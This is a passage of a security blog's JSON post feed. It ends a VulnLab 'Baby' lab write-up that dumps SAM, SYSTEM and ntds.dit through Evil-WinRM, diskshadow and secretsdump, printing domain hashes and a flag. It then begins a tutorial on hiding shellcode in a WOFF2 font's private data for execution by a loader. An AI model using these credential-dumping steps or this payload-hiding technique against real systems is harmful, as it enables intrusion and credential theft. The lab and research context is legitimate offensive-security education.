style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003eemp\u003cspan style=\"color:#ae81ff\"\u003e\\s\u003c/span\u003eam\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThe operation completed successfully.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e*Evil-WinRM* PS C:\u003cspan style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003eemp\u0026gt; reg save hklm\u003cspan style=\"color:#ae81ff\"\u003e\\s\u003c/span\u003eystem c:\u003cspan style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003eemp\u003cspan style=\"color:#ae81ff\"\u003e\\s\u003c/span\u003eystem\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThe operation completed successfully.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e*Evil-WinRM* PS C:\u003cspan style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003eemp\u0026gt; download sam\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e*Evil-WinRM* PS C:\u003cspan style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003eemp\u0026gt; download system\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThen with secretsdump we can obtain the administrator hash:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:43:10 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# secretsdump -sam sam -system system LOCAL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImpacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Dumping local SAM hashes \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003euid:rid:lmhash:nthash\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAdministrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Cleaning up...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eUnfortunately, we cannot use this hash because it\u0026rsquo;s for the local administrator, so we cannot use it to connect to the domain controller. We therefore need to obtain a hash for a domain account. To do this, we\u0026rsquo;ll need to dump the ntds.dit database using the Volume Shadow Copy technique. We\u0026rsquo;ll use the following script:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset metadata C:\u003cspan style=\"color:#ae81ff\"\u003e\\W\u003c/span\u003eindows\u003cspan style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003eemp\u003cspan style=\"color:#ae81ff\"\u003e\\m\u003c/span\u003eeta.cabX\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset context clientaccessibleX\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset context persistentX\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebegin backupX\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eadd volume C: alias cdriveX\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecreateX\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexpose %cdrive% E:X\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eend backupX\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ediskshadow /s script.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003erobocopy /b E:\u003cspan style=\"color:#ae81ff\"\u003e\\W\u003c/span\u003eindows\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003etds . ntds.dit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edownload ntds.dit\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eThen, locally we can extract the hashes:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:57:53 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# secretsdump -ntds ntds.dit -system system LOCAL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImpacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Dumping Domain Credentials \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003edomain\u003cspan style=\"color:#ae81ff\"\u003e\\u\u003c/span\u003eid:rid:lmhash:nthash\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Searching \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e pekList, be patient\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e PEK \u003cspan style=\"color:#75715e\"\u003e# 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Reading and decrypting hashes from ntds.dit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAdministrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eBABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:697f4174d13d804a333879a9410d1ec8:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ekrbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\J\u003c/span\u003eacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003eshley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\H\u003c/span\u003eugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\L\u003c/span\u003eeonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\I\u003c/span\u003ean.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\C\u003c/span\u003eonnor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\J\u003c/span\u003eoseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\K\u003c/span\u003eerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\T\u003c/span\u003eeresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ebaby.vl\u003cspan style=\"color:#ae81ff\"\u003e\\C\u003c/span\u003earoline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:3b1da22b1973c0bb86d4a9b6a9ae65f6:::\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Kerberos keys from ntds.dit\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAdministrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAdministrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAdministrator:des-cbc-md5:d38cb994ae806b97\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe can then connect with the Administrator account and its hash to get the flag:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e*Evil-WinRM* PS C:\u003cspan style=\"color:#ae81ff\"\u003e\\U\u003c/span\u003esers\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003edministrator\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eesktop\u0026gt; cat \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;C:/Users/Administrator/Desktop/root.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eVL\u003cspan style=\"color:#f92672\"\u003e{\u003c/span\u003e9000cab96bcf62e99073ff5f6653ce90\u003cspan style=\"color:#f92672\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","date":"2025-10-12","dateFormatted":"2025.10.12","excerpt":"\u003cp\u003eThis is a writeup for the VulnLab Baby easy machine. We\u0026rsquo;ll be dealing with a Windows environment where we\u0026rsquo;ll need to use LDAP enumeration and the password spraying technique. \u003c/p\u003e","featured":null,"mood":null,"permalink":"http://localhost:1313/posts/baby/vulnlab_baby/","readingTime":6,"slug":"vulnlab_baby","subtitle":null,"summary":"\u003cp\u003eThis is a writeup for the VulnLab Baby easy machine. We\u0026rsquo;ll be dealing with a Windows environment where we\u0026rsquo;ll need to use LDAP enumeration and the password spraying technique.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cp\u003eA first scan with nmap shows us the following ports:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 12, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:17:10 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# nmap -sSV --top-ports=1000 10.10.117.161\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eStarting Nmap 7.93 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e https://nmap.org \u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e at 2025-10-12 21:17 CEST\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNmap scan report \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e 10.10.117.161\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost is up \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e0.027s latency\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNot shown: \u003cspan style=\"color:#ae81ff\"\u003e987\u003c/span\u003e filtered tcp ports \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eno-response\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eserver time: 2025-10-12 19:17:45Z\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: baby.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e636/tcp  open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: baby.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3269/tcp open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eSSDP/UPnP\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe\u0026rsquo;re dealing with an Active Directory environment.\u003c/p\u003e","tags":["misc"],"title":"Vulnlab : Baby Easy","url":"http://localhost:1313/posts/baby/vulnlab_baby/","wordCount":1112},{"content":"\u003cp\u003eWe will see how the WOFF2 format can be abused to host shellcode and how the WinAPI, through its font-handling functions, can be leveraged to trigger its execution.\u003c/p\u003e\n\u003ch2 id=\"overview-of-woff2\"\u003eOverview of WOFF2\u003c/h2\u003e\n\u003cp\u003eWOFF2 is a file format proposed by Google in 2013 to replace the WOFF1 format. It provides better compression of font data for use in CSS.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSupports OpenType and TrueType (SFNT) specifications\u003c/li\u003e\n\u003cli\u003eUses the Brotli compression algorithm\u003c/li\u003e\n\u003cli\u003ePrimarily developed for the Web to enable faster page loading\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"woff2-structure\"\u003eWOFF2 structure\u003c/h3\u003e\n\u003cp\u003eWOFF2 is composed of several blocks. A header that lets you navigate the file format. The other blocks contain the data necessary to define the font. The block that interests us is Private Data. This is an optional block that allows the font author to include whatever information they want; it can contain ASCII, Unicode text, or raw data, provided those data do not interfere with font loading.\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"woff2_struct.png\" alt=\"woff2_struct\"\u003e\u003c/p\u003e\n\u003cp\u003eWe will use this block to hide our shellcode.\u003c/p\u003e\n\u003ch2 id=\"generating-the-woff2-file-with-the-shellcode\"\u003eGenerating the WOFF2 file with the shellcode\u003c/h2\u003e\n\u003cp\u003eFirst, it should be known that WOFF2 is similar to the SFNT format structure, the format used by TrueType or OpenType. The difference is that WOFF2 data are compressed.\u003c/p\u003e\n\u003cp\u003eTo generate our WOFF2 file we therefore need to start from a TTF or OTF file, add the private data block with our shellcode, then convert it to a WOFF2 file by compressing the font data.\u003c/p\u003e\n\u003cp\u003eTo do this we will use Python and the fontTools library.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e argparse\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e fontTools.ttLib \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e TTFont\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e fontTools.ttLib.woff2 \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e WOFF2FlavorData\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eadd_private_block\u003c/span\u003e(input_file, output_file, private_data):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    font \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e TTFont(input_file, recalcBBoxes\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e, recalcTimestamp\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    font\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eflavor \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;woff2\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e font\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eflavorData \u003cspan style=\"color:#f92672\"\u003eis\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        font\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eflavorData \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e WOFF2FlavorData()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        font\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eflavorData\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eprivData \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e private_data\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    font\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esave(output_file)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;[i] Private Data Block added to \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eoutput_file\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe define a function \u003ccode\u003eadd_private_block\u003c/code\u003e that takes as input a font file (\u003ccode\u003einput_file\u003c/code\u003e), an output file name (\u003ccode\u003eoutput_file\u003c/code\u003e) and the private data block (\u003ccode\u003eprivate_data\u003c/code\u003e) that will contain our shellcode. The font is loaded with the \u003ccode\u003eTTFont\u003c/code\u003e class. With \u003ccode\u003efont.flavor\u003c/code\u003e we force the file format to WOFF2. If no private data block is already present, the code creates a \u003ccode\u003eWOFF2FlavorData\u003c/code\u003e object and inserts the specified data into its \u003ccode\u003eprivData\u003c/code\u003e attribute. Then we save the generated WOFF2 file.\u003c/p\u003e\n\u003cp\u003eThe full script is available on my GitHub: \u003ca href=\"https://github.com/0xl0key\"\u003ehttps://github.com/0xl0key\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"loader-part\"\u003eLoader Part\u003c/h2\u003e\n\u003cp\u003eThe final part consists of writing a WOFF2 file parser to retrieve our shellcode and then using the WinAPI to execute our shellcode.\u003c/p\u003e\n\u003cp\u003eThe language choice here is C++, the language I am most comfortable with  feel free to re-adapt the loader in your preferred language.\u003c/p\u003e\n\u003ch3 id=\"parsing-the-woff2-header\"\u003eParsing the WOFF2 Header\u003c/h3\u003e\n\u003cp\u003eTo parse the WOFF2 file we must refer to its Header because it contains all the information necessary to navigate the file. The header specification is available on the W3C site:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"header.png\" alt=\"header\"\u003e\u003c/p\u003e\n\u003cp\u003eWith this information we can describe a C++ structure representing our 